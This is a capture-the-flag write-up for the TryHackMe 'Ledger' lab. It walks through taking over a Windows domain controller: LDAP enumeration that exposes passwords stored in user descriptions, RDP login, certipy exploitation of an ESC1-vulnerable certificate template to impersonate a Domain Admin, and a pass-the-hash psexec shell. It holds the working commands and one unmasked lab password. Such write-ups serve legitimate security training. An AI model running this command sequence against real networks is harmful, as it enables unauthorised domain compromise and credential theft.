This is a write-up 
for the 'Ledger' challenge available on TryHackMe; you can find the hard rated room 
there: <https://tryhackme.com/room/ledger>.

## Description

> Start the virtual machine by pressing the Start Machine button attached in this task. You may access the VM by using the AttackBox or your VPN connection.
>
> Can you find all the flags?
>
> Note: The VM takes about 5 minutes to fully boot up. All the necessary tools are already available on the AttackBox.

## Enumeration

As always I started with a basic `nmap` scan.
```sh
sudo nmap -sV -sC -oA nmap/machine -vv 10.10.214.56
```

The results showed 14 open ports. The TTL reveals that the server is a Windows server and the LDAP,RDP and SMB ports reveal that this is a domain controller. The server has two web servers running one on port 80, the other one on port 443, they do not display anything. In addition to that RDP is available at port `3389`. Finally LDAP is accessible via port `389` and port `636`.

```

```

Also, the scan discloses the domain name and the host name of the domain controller. The domain is `thm.local` and the host name `LABYRINTH`.

## Initial Access

The first thing I did is enumerating the domain controller for users and policies. To accomplish this, you can use `netexec` and query LDAP which allows you to query user information.

```terminal
nxc ldap 10.10.214.56 -u "a" -p "" --users
```

**Note:** The command above will return a massive amount of users, descriptions and additional information, the lines below are only the important ones.

In the output of the command, there are two users who seem to have requested a password reset, as indicated by the text and password included in their descriptions.

```
LDAP        10.10.214.56    389    LABYRINTH        IVY_WILLIS                    2023-05-30 12:30:55 0       Please change it: ************
LDAP        10.10.214.56    389    LABYRINTH        SUSANNA_MCKNIGHT              2023-07-05 15:11:32 0       Please change it: ************
```

Next I checked if one of the users has access to RDP and potentially can login and get a shell. For that you can first try to gather information using bloodhound, but this time you can simply check it using the command line and don't need to go through the complex process of setting up bloodhound. I simply tried it with `netexec`:

```terminal
$nxc rdp 10.10.214.56 -u "IVY_WILLIS" -p "************"
RDP         10.10.214.56    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.10.214.56    3389   LABYRINTH        [+] thm.local\IVY_WILLIS:************ 
$nxc rdp 10.10.214.56 -u "SUSANNA_MCKNIGHT" -p "************"
RDP         10.10.214.56    3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.10.214.56    3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:************ (Pwn3d!)
```

Fortunately, the user `SUSANNA_MCKNIGHT` has access to RDP and can login. I connected to the server using Remmina which is a simple RDP tool.

After login you are greeted with the user flag.

## Privilege Escalation

To gain further privileges I enumerated the users privileges using the command prompt.

I found the group below:

```
$ whoami /all
...
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
...
```

The group `Certificate Service DCOM Access`, to which the user `SUSANNA_MCKNIGHT` has access is a strong indicator that you need to exploit a certificate vulnerability to root this machine.

To enumerate any certificates you normally can use `Certify.exe`, which you can simply load on the machine and then you can enumerate the certificates. In this case this is not possible because the server is running Windows Defender, which will remove the file immediately after it is uploaded. To overcome this issue there is a tool called `certipy` which can be used to enumerate and exploit the server from your own, so no need for an executable.

For exploiting a weak managed certificate you first need to find one, `certipy` has a handy built in function for scanning for vulnerable certs.

```terminal
certipy find -u 'SUSANNA_MCKNIGHT' -p "************" -dc-ip 10.10.214.56 -vulnerable -stdout
```

Executing the command will yield three certificates as a result. The first one is root Certificate of the Public Key Infrastructure (PKI). So this is not useful. The third certificate is disabled, so also not useful. Finally the second certificate looks promising:

```
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth

        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
  1
```

The certificate is vulnerable to ESC1. With that any low-privileged user can request a certificate that allows them to authenticate as a privileged user (e.g., a Domain Admin), due to a misconfigured or overly permissive AD CS template.

I first searched for a user which is in the domain admin group and can login with a simple shell.

```
$ Get-ADGroupMember -Identity "Domain Admins" -Recursive

distinguishedName : CN=Administrator,CN=Users,DC=thm,DC=local
name              : Administrator
objectClass       : user
objectGUID        : 07822fd3-6443-4bf6-bb1e-341283a7318c
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500

distinguishedName : CN=BERNARD_CARNEY,OU=AZR,OU=Tier 1,DC=thm,DC=local

objectClass       : user
objectGUID        : a29b0bc2-9fe0-4e8e-a905-ec4f77fe3a39
SamAccountName    : BERNARD_CARNEY
SID               : S-1-5-21-1966530601-3185510712-10604624-1248

distinguishedName : CN=BRADLEY_ORTIZ,OU=FSR,OU=Tier 1,DC=thm,DC=local
name              : BRADLEY_ORTIZ
objectClass       : user
objectGUID        : 319bff06-5900-44cd-b9b6-a3fc5c157ef0
SamAccountName    : BRADLEY_ORTIZ
SID               : S-1-5-21-1966530601-3185510712-10604624-1358

distinguishedName : CN=BEVERLY_FARRELL,OU=AZR,OU=Tier 1,DC=thm,DC=local
name              : BEVERLY_FARRELL
objectClass       : user
objectGUID        : 88672f30-9c2f-4485-ba69-5d375b581d55
SamAccountName    : BEVERLY_FARRELL
SID               : S-1-5-21-1966530601-3185510712-10604624-1588
```

Then I tired getting a certificate of the first two members of the group but that didn't work. The user which worked was `BRADLEY_ORTIZ`, so I generated a certificate request.

```
certipy req -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template ServerAuth -upn 'BRADLEY_ORTIZ@THM.LOCAL' -dc-ip 10.10.214.56
```

Then I authenticated, which returns the hashes of the user:

```
certipy auth -pfx bradley_ortiz.pfx -dc-ip 10.10.214.56
```
And finally I used the hashes to get a shell.

**Note:** You need to add the domain name to your host file for that: `echo "10.10.214.56 thm.local" | sudo tee -a /etc/hosts`

```
$ psexec.py -hashes hash:hash thm.local/BRADLEY_ORTIZ@THM.LOCAL

## Conclusion

Misconfigured/Vulnerable certificates are always something to check in CTFs, all in all the room was really nice.
